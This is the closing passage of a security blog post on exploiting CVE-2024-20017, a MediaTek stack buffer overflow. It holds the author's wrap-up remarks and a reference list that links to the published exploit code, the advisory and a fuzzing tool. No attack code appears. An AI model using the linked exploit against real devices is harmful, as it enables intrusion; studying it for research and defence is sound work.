<a class="anchor" href="#wrapping-up" aria-hidden="true"><span class="octicon octicon-link"></span></a>wrapping up</h2>

<p>This post ended up being much longer than I had initially intended it to be! I hope I provided
enough info along the way without making it boring or (too) confusing. I also hope itâs helpful to
anyone looking to learn more about exploit development and that it can provide some insight into the
different approaches that can be taken in different circumstances. Exploiting a stack buffer
overflow is fundamentally the same across all codebases â itâs everything else around the overflow
that makes it interesting and challenging. Itâs like working on an intricate puzzle where thereâs no
guarantee all of the pieces will fit together but thereâs also more than one way to solve it. This
is what makes exploit development fun for me and why Iâd go through the trouble of writing 4
different exploits for the same bug. This shit breaks your brain a little lol.</p>

<h2 id="references">
<a class="anchor" href="#references" aria-hidden="true"><span class="octicon octicon-link"></span></a>references</h2>

<ul>
  <li><a href="https://github.com/mellow-hype/cve-2024-20017" target="_blank">Exploit code</a></li>
  <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-20017" target="_blank">NVD - CVE-2024-20017</a></li>
  <li><a href="https://corp.mediatek.com/product-security-bulletin/March-2024" target="_blank">MediaTek March 2024
  Advisory</a></li>
  <li><a href="https://github.com/denandz/fuzzotron" target="_blank">Fuzzotron</a></li>
  <li><a href="https://downloads.openwrt.org/snapshots/targets/mediatek/mt7622/" target="_blank">OpenWrt MT7622 images
  page</a></li>
</ul>


  </div>

  <a class="u-url" href="/0day/2024/08/30/exploiting-CVE-2024-20017-four-different-ways.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <!-- <h2 class="footer-heading">hyprblog</h2> -->

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">
          <!-- <img src="/assets/images/metal.25.jpg" style="float: left; padding: 5px 12px 5px 5px;"> --></li><ul class="social-media-list"><li><a href="https://twitter.com/hyprdude"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">hyprdude</span></a></li><li><a href="https://github.com/mellow-hype"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">mellow-hype</span></a></li><li><a href="https://infosec.exchange/@hypr"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#mastodon"></use></svg> <span class="username">hypr</span></a></li></ul>
</ul>
      </div>

      <div class="footer-col footer-col-2">
        <!--<ul class="social-media-list"><li><a href="https://twitter.com/hyprdude"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">hyprdude</span></a></li><li><a href="https://github.com/mellow-hype"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">mellow-hype</span></a></li><li><a href="https://infosec.exchange/@hypr"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#mastodon"></use></svg> <span class="username">hypr</span></a></li></ul>
-->
      </div>

      <div class="footer-col footer-col-3">
        <!-- <p>Vulnerability research, software development, and other technobabble.</p> -->
        <p>"angelheaded hipsters burning for the ancient heavenly connection to the starry dynamo in the machinery
          of night"
        </p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
